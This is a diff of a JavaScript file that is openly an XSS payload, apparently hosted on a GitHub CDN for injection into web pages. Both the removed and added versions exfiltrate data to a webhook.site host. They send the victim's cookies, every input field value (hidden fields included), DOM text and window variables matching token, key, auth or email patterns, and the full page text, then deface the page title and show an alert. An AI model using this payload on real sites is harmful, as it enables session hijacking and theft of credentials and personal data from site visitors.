@@ -1,41 +1,58 @@
-console.log("🚀 XSS Payload Injected");
+console.log("🚀 Advanced XSS Payload Started");
 
-// Send all cookies
+// 1. Change page title & mark DOM
+document.title = "☠️ SYSTEM COMPROMISED";
+document.body.setAttribute("data-xss", "executed");
+
+// 2. Send cookies
 new Image().src = "https://bab6baf9-25da-4e4a-8c5c-6bbb9c589995.webhook.site/cookie?c=" + encodeURIComponent(document.cookie);
 
-// Change page title and mark DOM
-document.title = "☠️ SYSTEM COMPROMISED - XSS Executed";
-document.body.setAttribute("data-pwned", "true");
-
-// Extract potential sensitive text from visible elements
-let potentialData = [];
-document.querySelectorAll("*").forEach(el => {
-  let text = el.innerText || el.value || "";
-  if (text.match(/@|token|key|user|email|api|session|auth/i)) {
-    potentialData.push(`${el.tagName}: ${text}`);
-  }
+// 3. Extract hidden and text input fields
+let fields = [];
+document.querySelectorAll('input').forEach(input => {
+  fields.push(`${input.name || input.id}: ${input.value}`);
 });
-if (potentialData.length) {
-  fetch("https://bab6baf9-25da-4e4a-8c5c-6bbb9c589995.webhook.site/data-sniff", {
+if (fields.length) {
+  fetch("https://bab6baf9-25da-4e4a-8c5c-6bbb9c589995.webhook.site/inputs", {
     method: "POST",
-    body: potentialData.join("\n")
+    body: fields.join("\n")
   });
 }
 
-// Extract hidden input fields
-document.querySelectorAll('input[type="hidden"]').forEach(input => {
-  fetch("https://bab6baf9-25da-4e4a-8c5c-6bbb9c589995.webhook.site/hidden-fields", {
-    method: "POST",
-    body: `${input.name}=${input.value}`
-  });
+// 4. Analyze DOM text for emails/tokens
+let sensitive = [];
+document.querySelectorAll("*").forEach(el => {
+  let text = el.innerText || el.value || "";
+  if (text.match(/@|token|key|auth|user|api/i)) {
+    sensitive.push(`${el.tagName}: ${text}`);
+  }
 });
+if (sensitive.length) {
+  fetch("https://bab6baf9-25da-4e4a-8c5c-6bbb9c589995.webhook.site/sensitive", {
+    method: "POST",
+    body: sensitive.join("\n")
+  });
+}
 
-// Send page text content (DOM summary)
+// 5. Deep window object analysis
+let windowVars = Object.entries(window)
+  .filter(([k, v]) => typeof v === "string" && v.match(/@|token|auth|user|api|key/i))
+  .map(([k, v]) => `${k}: ${v}`);
+if (windowVars.length) {
+  fetch("https://bab6baf9-25da-4e4a-8c5c-6bbb9c589995.webhook.site/window-vars", {
+    method: "POST",
+    body: windowVars.join("\n")
+  });
+}
+
+// 6. Send complete innerText of page
 fetch("https://bab6baf9-25da-4e4a-8c5c-6bbb9c589995.webhook.site/domtext", {
   method: "POST",
   body: document.body.innerText
 });
 
-// Alert for visual proof
-alert("🔥 Executed XSS from GitHub CDN!");
-console.log("✅ Execution complete");
+// 7. Show visual alert
+setTimeout(() => {
+  alert("🔥 ADVANCED XSS EXECUTED!");
+  console.log("✅ Alert triggered");
+}, 1000);
